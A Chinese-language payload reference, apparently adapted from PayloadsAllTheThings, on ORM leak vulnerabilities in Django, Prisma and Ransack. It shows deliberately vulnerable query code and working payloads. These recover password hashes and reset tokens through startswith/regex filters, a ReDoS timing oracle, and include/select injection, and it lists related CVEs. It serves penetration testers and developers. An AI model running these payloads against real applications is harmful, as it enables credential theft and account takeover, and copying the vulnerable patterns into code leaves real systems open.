# ORM Leak - ORM泄露

[SEARCH_KEYWORDS]
漏洞类型: ORM Leak ORM泄露 Object Relational Mapping Leak
攻击类型: Information Disclosure Data Exfiltration Credential Leak
关键词: ORM filter query Django Prisma Ransack SQLAlchemy
框架: Django Prisma Ransack Ruby on Rails Node.js
技术: Query Filter Relational Filtering ReDOS Time-based Attack
操作符: __startswith __contains __regex filter select include

[CONTENT]

## ORM泄露概述

ORM泄露漏洞发生在敏感信息（如数据库结构或用户数据）由于不当处理ORM查询而被意外暴露。这可能发生在应用程序返回原始错误消息、调试信息，或允许攻击者以揭示底层数据的方式操纵查询时。

## Django (Python)

### 漏洞代码

```py
users = User.objects.filter(**request.data)
serializer = UserSerializer(users, many=True)
```

使用解包操作符(`**`)允许用户动态控制过滤参数。

### 查询过滤器

攻击者可控制列过滤：

```json
{
    "username": "admin",
    "password__startswith": "p"
}
```

有用的过滤器：
- `__startswith`
- `__contains`
- `__regex`

### 关系过滤

**一对一关系**：

```json
{
    "created_by__user__password__contains": "p"
}
```

**多对多关系**：

```json
{
    "created_by__departments__employees__user__username__startswith": "p",
    "created_by__departments__employees__user__id": 1
}
```

### 基于错误的泄露 (ReDOS)

如果Django使用MySQL：

```json
{"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"}
// => 返回结果

{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
// => 错误500 (正则匹配超时)
```

## Prisma (Node.JS)

### 漏洞代码

```js
const posts = await prisma.article.findMany({
    where: req.query.filter as any
})
```

### Include泄露

```json
{
    "filter": {
        "include": {
            "createdBy": true
        }
    }
}
```

### Select泄露

```json
{
    "filter": {
        "select": {
            "createdBy": {
                "select": {
                    "password": true
                }
            }
        }
    }
}
```

### 关系过滤

一对一：`filter[createdBy][resetToken][startsWith]=06`

多对多：复杂嵌套查询

## Ransack (Ruby)

版本 < 4.0.0 存在漏洞。

### 提取密码重置令牌

```ps1
GET /posts?q[user_reset_password_token_start]=0 -> 空结果
GET /posts?q[user_reset_password_token_start]=1 -> 空结果
GET /posts?q[user_reset_password_token_start]=2 -> 有结果
```

### 目标特定用户

```ps1
GET /labs?q[creator_roles_name_cont]=superadmin&q[creator_recoveries_key_start]=0
```

## 工具

- plormber - ORM泄露时间基础漏洞利用工具

## CVE

- CVE-2023-47117: Label Studio ORM Leak
- CVE-2023-31133: Ghost CMS ORM Leak
- CVE-2023-30843: Payload CMS ORM Leak

## 参考文档

原始来源: PayloadsAllTheThings/ORM Leak/README.md